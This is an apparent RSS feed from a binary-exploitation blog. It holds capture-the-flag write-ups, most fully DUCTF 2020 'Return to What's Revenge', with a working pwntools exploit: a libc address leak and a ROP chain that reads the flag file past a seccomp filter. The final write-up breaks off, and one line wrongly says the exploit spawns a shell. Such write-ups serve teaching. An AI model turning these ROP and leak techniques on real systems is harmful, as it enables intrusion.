close(fd);
return 0;
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;pre>&lt;code>~/ $ gcc exploit.c -o exploit -static
&lt;/code>&lt;/pre>&lt;p>After running our exploit, and checking &lt;code>dmesg&lt;/code>, we can see that the kernel printed &amp;ldquo;Hello, Anvbis!&amp;rdquo; and &amp;ldquo;Goodbye, Anvbis!&amp;rdquo; as per the instructions we sent it via ioctl.&lt;/p>
&lt;pre>&lt;code>/ # insmod ./challenge.ko
/ # ./exploit
&lt;/code>&lt;/pre>&lt;pre>&lt;code>/ # dmesg
...
[ 12.187784] device '/proc/challenge' opened
[ 12.188714] Hello, Anvbis!
[ 12.189492] Goodbye, Anvbis!
[ 12.189747] device '/proc/challenge' closed
&lt;/code>&lt;/pre>&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://linux-kernel-labs.github.io/refs/heads/master/labs/kernel_modules.html">The Linux Kernel Documentation - Kernel Modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://students.mimuw.edu.pl/SO/Linux-doc/lkmpg.pdf">The Linux Kernel Programming Guide - Talking to Device Files&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sysplay.github.io/books/LinuxDrivers/book/Content/Part09.html">LinuxDrivers - I/O Control in Linux&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sysplay.github.io/books/LinuxDrivers/book/Content/Part17.html">LinuxDrivers - Module Interactions&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>About</title><link>https://anvbis.github.io/about/</link><pubDate>Mon, 03 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/about/</guid><description>About Me I just love binary exploitation, man.
I&amp;rsquo;m currently expanding my knowledge about Linux kernel exploitation and browser exploitation (with a strong focus on V8 and JavaScript engines).
Maybe I&amp;rsquo;ll get decent at it someday.
Contact Me If you can solve the reversing challenge linked below you&amp;rsquo;ll find my contact information.
contact.zip
$ md5sum ./contact 51f000ce9d06fddc6c08e2af16e24e3b ./contact</description><content>&lt;h2 id="about-me">About Me&lt;/h2>
&lt;p>I just love binary exploitation, man.&lt;/p>
&lt;p>I&amp;rsquo;m currently expanding my knowledge about Linux kernel exploitation and browser exploitation (with a strong focus on V8 and JavaScript engines).&lt;/p>
&lt;p>Maybe I&amp;rsquo;ll get decent at it someday.&lt;/p>
&lt;h2 id="contact-me">Contact Me&lt;/h2>
&lt;p>If you can solve the reversing challenge linked below you&amp;rsquo;ll find my contact information.&lt;/p>
&lt;p>&lt;a href="https://anvbis.github.io/files/contact.zip">contact.zip&lt;/a>&lt;/p>
&lt;pre>&lt;code>$ md5sum ./contact
51f000ce9d06fddc6c08e2af16e24e3b ./contact
&lt;/code>&lt;/pre></content></item><item><title>DUCTF 2020 :: Return to What's Revenge</title><link>https://anvbis.github.io/posts/ductf-2020-return-to-whats-revenge/</link><pubDate>Tue, 17 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/ductf-2020-return-to-whats-revenge/</guid><description>Reverse Engineering Running file tells us that the target binary is a 64-bit dynamically linked linux executable.
$ file ./return-to-whats-revenge ./return-to-whats-revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=85709e2a953fc6f7da43f29d1dee0c5cc682a059, with debug_info, not stripped We can run pwntools' checksec tool to get a better overview of the protections the target binary has in place. Note that the only protection in place is DEP, so we&amp;rsquo;ll likely have to build a ROP chain to bypass it.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>Running &lt;code>file&lt;/code> tells us that the target binary is a 64-bit dynamically linked linux executable.&lt;/p>
&lt;pre>&lt;code>$ file ./return-to-whats-revenge
./return-to-whats-revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=85709e2a953fc6f7da43f29d1dee0c5cc682a059, with debug_info, not stripped
&lt;/code>&lt;/pre>&lt;p>We can run pwntools' &lt;code>checksec&lt;/code> tool to get a better overview of the protections the target binary has in place. Note that the only protection in place is DEP, so we&amp;rsquo;ll likely have to build a ROP chain to bypass it.&lt;/p>
&lt;pre>&lt;code>$ checksec ./return-to-whats-revenge
[*] './return-to-whats-revenge'
Arch: amd64-64-little
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;p>Running the binary shows us that it simply prompts the user for input prior to exiting. It&amp;rsquo;s likely we&amp;rsquo;ll find a vulnerability of some sort where it takes user input.&lt;/p>
&lt;pre>&lt;code>$ ./return-to-whats-revenge
Today, we'll have a lesson in returns.
Where would you like to return to?
asdf
&lt;/code>&lt;/pre>&lt;p>Disassembling the executable shows us that it contains two important functions. The &lt;code>main&lt;/code> function calls a function called &lt;code>vuln&lt;/code>. The &lt;code>vuln&lt;/code> function makes a &lt;code>gets&lt;/code> call with a stack variable, so we&amp;rsquo;ve found a stack buffer overflow.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">vuln&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>s;
puts(&lt;span style="color:#e6db74">&amp;#34;Where would you like to return to?&amp;#34;&lt;/span>);
gets(&lt;span style="color:#f92672">&amp;amp;&lt;/span>s);
&lt;span style="color:#66d9ef">return&lt;/span>;
}
undefined8 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
puts(&lt;span style="color:#e6db74">&amp;#34;Today, we&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">ll have a lesson in returns.&amp;#34;&lt;/span>);
vuln();
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Running &lt;code>strace&lt;/code> on the binary shows us that (at some point prior to taking user input) instantiates several &lt;code>seccomp&lt;/code> rules, so not only will we have to build a ROP chain, we&amp;rsquo;ll have to work within the &lt;code>seccomp&lt;/code> jail.&lt;/p>
&lt;pre>&lt;code>$ strace ./return-to-whats-revenge
...
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=25, filter=0x7fff935ea670}) = 0
...
&lt;/code>&lt;/pre>&lt;p>We can use a wonderful tool called &lt;code>seccomp-tools&lt;/code> to dump the &lt;code>seccomp&lt;/code> rules that the binary operates under. Note that the binary allows the &lt;code>open&lt;/code>, &lt;code>read&lt;/code>, and &lt;code>write&lt;/code> syscalls - so we should be able to build a ROP chain that opens, reads, and writes the flag to &lt;code>stdout&lt;/code>.&lt;/p>
&lt;pre>&lt;code>$ seccomp-tools dump ./return-to-whats-revenge
line CODE JT JF K
=================================
0000: 0x20 0x00 0x00 0x00000004 A = arch
0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003
0002: 0x06 0x00 0x00 0x00000000 return KILL
0003: 0x20 0x00 0x00 0x00000000 A = sys_number
0004: 0x15 0x00 0x01 0x0000000f if (A != rt_sigreturn) goto 0006
0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0006: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0008
0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010
0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0010: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0012
0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0012: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0014
0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0014: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0016
0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0016: 0x15 0x00 0x01 0x0000000c if (A != brk) goto 0018
0017: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0018: 0x15 0x00 0x01 0x00000009 if (A != mmap) goto 0020
0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0020: 0x15 0x00 0x01 0x0000000a if (A != mprotect) goto 0022
0021: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0022: 0x15 0x00 0x01 0x00000003 if (A != close) goto 0024
0023: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0024: 0x06 0x00 0x00 0x00000000 return KILL
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s use &lt;code>readelf&lt;/code> to get the address of the binary&amp;rsquo;s &lt;code>.data&lt;/code> section, we&amp;rsquo;ll want to use it to store our &lt;code>flag.txt&lt;/code> string that we use in the &lt;code>open&lt;/code> syscall of our ROP chain.&lt;/p>
&lt;pre>&lt;code>$ readelf --sections ./return-to-whats-revenge
..
[22] .data PROGBITS 0000000000404000 00003000
0000000000000010 0000000000000000 WA
...
&lt;/code>&lt;/pre>&lt;p>Earlier we noticed that the binary uses &lt;code>puts&lt;/code>, we can use this to perform a simple &lt;code>puts(puts)&lt;/code> style leak to obtain the an address in &lt;code>libc&lt;/code>. Let&amp;rsquo;s find the offset of &lt;code>puts&lt;/code> from the base of &lt;code>libc&lt;/code>. We&amp;rsquo;ll want to use this later to find the base address of &lt;code>libc&lt;/code>.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; info proc map
process 1461
Mapped address spaces:
Start Addr End Addr Size Offset objfile
...
0x7ffff7def000 0x7ffff7e14000 0x25000 0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
pwndbg&amp;gt; p puts
$2 = {int (const char *)} 0x7ffff7e655f0 &amp;lt;__GI__IO_puts&amp;gt;
pwndbg&amp;gt; p/x 0x7ffff7e655f0-0x7ffff7def000
$3 = 0x765f0
&lt;/code>&lt;/pre>&lt;p>Lastly, we just need to find a bunch of different ROP gadgets in order to perform our exploit. These are mostly just &lt;code>pop reg; ret&lt;/code> instructions that we can use to move values into the registers we need to perform syscalls, and a &lt;code>syscall&lt;/code> instruction that&amp;rsquo;ll allow us to execute our &lt;code>open&lt;/code>, &lt;code>read&lt;/code>, and &lt;code>write&lt;/code> syscalls.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./return-to-whats-revenge --search 'pop rdi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi
[INFO] File: ./return-to-whats-revenge
0x00000000004019db: pop rdi; ret;
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ ropper --file ./return-to-whats-revenge --search 'pop rsi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rsi
[INFO] File: ./return-to-whats-revenge
0x00000000004019d9: pop rsi; pop r15; ret;
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'pop rdx'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdx
[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x00000000000cb1cd: pop rdx; ret;
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'pop rax'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rax
[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x000000000003ee88: pop rax; ret;
...
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'syscall'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: syscall
[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x00000000000580da: syscall; ret;
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>The only bit of information we now need to gather is the offset of the return address from our input buffer.&lt;/p>
&lt;p>Here&amp;rsquo;s a quick script that&amp;rsquo;ll attach the process to GDB before sending a large cyclic pattern of bytes to it, allowing us to find the offset of the return address from our input buffer.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./return-to-whats-revenge&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">300&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After continuing in GDB and letting the program crash, we can see what was stored in the return address.&lt;/p>
&lt;pre>&lt;code> ► 0x4011d9 &amp;lt;vuln+39&amp;gt; ret &amp;lt;0x6161616161616168&amp;gt;
&lt;/code>&lt;/pre>&lt;p>We can use pwntools' &lt;code>cyclic_find&lt;/code> function to calculate the offset of the return address from the start of our input buffer (using the value stored in the return address we found above).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616161616168&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">56&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>Now that we have everything we need, we can start to write our exploit. There&amp;rsquo;s a lot of things we&amp;rsquo;ll need to achieve (leaks, etc), so here&amp;rsquo;s a brief summary of what we want to do:&lt;/p>
&lt;ul>
&lt;li>Overwrite the return address to gain control of process execution.&lt;/li>
&lt;li>Perform a &lt;code>puts(puts)&lt;/code> leak to obtain an address in &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>Calculate the base address of &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>Return back to &lt;code>main&lt;/code> so we can perform the second stage of our exploit.&lt;/li>
&lt;li>Build a ROP chain that opens, reads, and writes the contents of &lt;code>flag.txt&lt;/code>.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> time
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>clear(arch&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>)
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">return-to-whats-revenge
&lt;/span>&lt;span style="color:#e6db74">0x00000000004019db: pop rdi; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4019db&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">return-to-whats-revenge
&lt;/span>&lt;span style="color:#e6db74">0x00000000004019d9: pop rsi; pop r15; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rsi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4019d9&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">libc-3.1.so
&lt;/span>&lt;span style="color:#e6db74">0x00000000000cb1cd: pop rdx; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rdx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0cb1cd&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">libc-3.1.so
&lt;/span>&lt;span style="color:#e6db74">0x000000000003ee88: pop rax; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rax &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x03ee88&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">libc-3.1.so
&lt;/span>&lt;span style="color:#e6db74">0x00000000000580da: syscall; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
syscall &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0580da&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./return-to-whats-revenge&amp;#39;&lt;/span>)
elf &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-whats-revenge&amp;#39;&lt;/span>)
rop &lt;span style="color:#f92672">=&lt;/span> ROP(elf)
rop&lt;span style="color:#f92672">.&lt;/span>raw(pop_rdi)
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>got[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#75715e"># pop rdi ; got.puts&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>plt[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>])
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;main&amp;#39;&lt;/span>])
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain())
leak &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>readline()[:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]
leak &lt;span style="color:#f92672">=&lt;/span> unpack(leak, len(leak) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>)
libc &lt;span style="color:#f92672">=&lt;/span> leak &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x765f0&lt;/span>
rop &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;span style="color:#75715e"># read(.data, stdin, 9)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">0&lt;/span>, pop_rsi, &lt;span style="color:#ae81ff">0x404000&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rdx, &lt;span style="color:#ae81ff">9&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall,
&lt;span style="color:#75715e"># open(&amp;#34;flag.txt&amp;#34;, 0, 0)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">0x404000&lt;/span>, pop_rsi, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rdx, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">2&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall,
&lt;span style="color:#75715e"># read(3, .data+0x10, 35)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">3&lt;/span>, pop_rsi, &lt;span style="color:#ae81ff">0x404010&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rdx, &lt;span style="color:#ae81ff">35&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall,
&lt;span style="color:#75715e"># write(stdout, .data+0x10, 35)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">1&lt;/span>, pop_rsi, &lt;span style="color:#ae81ff">0x404010&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rdx, &lt;span style="color:#ae81ff">35&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">1&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall,
&lt;span style="color:#75715e"># exit(0)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">60&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall
)
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> rop)
r&lt;span style="color:#f92672">.&lt;/span>writeline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;flag.txt&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>readuntil(&lt;span style="color:#e6db74">&amp;#39;Where would you like to return to?&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
print(r&lt;span style="color:#f92672">.&lt;/span>readall())
r&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action. It spawns an interactive shell that we can use to retrieve the flag.&lt;/p>
&lt;pre>&lt;code>$ ./exploit.py
[+] Starting local process './return-to-whats-revenge': pid 2683
[*] './return-to-whats-revenge'
Arch: amd64-64-little
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
[*] Loaded 14 cached gadgets for './return-to-whats-revenge'
Today, we'll have a lesson in returns.
Where would you like to return to?
DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}
[*] Stopped process './return-to-whats-revenge' (pid 2683)
&lt;/code>&lt;/pre></content></item><item><title>DUCTF 2020 :: Return to What</title><link>https://anvbis.github.io/posts/ductf-2020-return-to-what/</link><pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/ductf-2020-return-to-what/</guid><description>Reverse Engineering We&amp;rsquo;ll start by running file to get an idea of the executable&amp;rsquo;s architecture and platform. Note that it is a 64-bit linux executable.
$ file return-to-what return-to-what: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=02d43d7f8ca04895439f73b904f5204ba9984802, not stripped Running pwntools' checksec tool reveals that the only exploit protection in place is an enabled NX bit. So while we can&amp;rsquo;t execute shellcode on the stack, we&amp;rsquo;ll at least be able to access any part of the executable.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>We&amp;rsquo;ll start by running &lt;code>file&lt;/code> to get an idea of the executable&amp;rsquo;s architecture and platform. Note that it is a 64-bit linux executable.&lt;/p>
&lt;pre>&lt;code>$ file return-to-what
return-to-what: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=02d43d7f8ca04895439f73b904f5204ba9984802, not stripped
&lt;/code>&lt;/pre>&lt;p>Running pwntools' &lt;code>checksec&lt;/code> tool reveals that the only exploit protection in place is an enabled NX bit. So while we can&amp;rsquo;t execute shellcode on the stack, we&amp;rsquo;ll at least be able to access any part of the executable.&lt;/p>
&lt;pre>&lt;code>$ checksec return-to-what 130 ⨯
[*] './return-to-what'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;p>Running the executable reveals that it&amp;rsquo;s only functionality is to accept user input, prior to exiting. It&amp;rsquo;s likely that we&amp;rsquo;ll find a vulnerability of some sort here.&lt;/p>
&lt;pre>&lt;code>$ ./return-to-what
Today, we'll have a lesson in returns.
Where would you like to return to?
asdf
&lt;/code>&lt;/pre>&lt;p>Disassembly the executable shows us that it contains two important functions. The &lt;code>main&lt;/code> function, which calls a function called &lt;code>vuln&lt;/code>. The &lt;code>vuln&lt;/code> function makes a &lt;code>gets&lt;/code> call, we&amp;rsquo;ve found a buffer overflow.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">vuln&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>s;
puts(&lt;span style="color:#e6db74">&amp;#34;Where would you like to return to?&amp;#34;&lt;/span>);
gets(&lt;span style="color:#f92672">&amp;amp;&lt;/span>s);
&lt;span style="color:#66d9ef">return&lt;/span>;
}
undefined8 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
puts(&lt;span style="color:#e6db74">&amp;#34;Today, we&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">ll have a lesson in returns.&amp;#34;&lt;/span>);
vuln();
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Since the executable doesn&amp;rsquo;t leak any import information to us (such as a &lt;code>libc&lt;/code> address), we&amp;rsquo;ll have to find a way to leak something ourselves.&lt;/p>
&lt;p>Looking at the imported functions, we can see an entry for &lt;code>puts&lt;/code>. With this we should be able to do a classic &lt;code>libc&lt;/code> leak with &lt;code>puts(puts)&lt;/code>, more on that later.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; info functions
All defined functions:
Non-debugging symbols:
0x0000000000401000 _init
0x0000000000401030 puts@plt
0x0000000000401040 gets@plt
0x0000000000401050 setvbuf@plt
0x0000000000401060 _start
0x0000000000401090 _dl_relocate_static_pie
0x00000000004010a0 deregister_tm_clones
0x00000000004010d0 register_tm_clones
0x0000000000401110 __do_global_dtors_aux
0x0000000000401140 frame_dummy
0x0000000000401142 setup
0x0000000000401185 vuln
0x00000000004011ad main
0x00000000004011d0 __libc_csu_init
0x0000000000401230 __libc_csu_fini
0x0000000000401234 _fini
&lt;/code>&lt;/pre>&lt;p>Before going any further, let&amp;rsquo;s find the offset of the &lt;code>puts&lt;/code> function within &lt;code>libc&lt;/code>. Below is a few GDB commands that achieves this goal.&lt;/p>
&lt;p>Here&amp;rsquo;s what we&amp;rsquo;re doing:&lt;/p>
&lt;ul>
&lt;li>Printing the process map to get the start address of &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>Getting the address of &lt;code>puts&lt;/code>.&lt;/li>
&lt;li>Subtracting the start address of &lt;code>libc&lt;/code> from &lt;code>puts&lt;/code> to get the offset.&lt;/li>
&lt;/ul>
&lt;pre>&lt;code>pwndbg&amp;gt; info proc map
process 1968
Mapped address spaces:
Start Addr End Addr Size Offset objfile
...
0x7ffff7def000 0x7ffff7e14000 0x25000 0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
pwndbg&amp;gt; p puts
$4 = {int (const char *)} 0x7ffff7e655f0 &amp;lt;__GI__IO_puts&amp;gt;
pwndbg&amp;gt; p/x 0x7ffff7e655f0-0x7ffff7def000
$5 = 0x765f0
&lt;/code>&lt;/pre>&lt;p>There are a few more things we need to find before we can write our shellcode, mainly:&lt;/p>
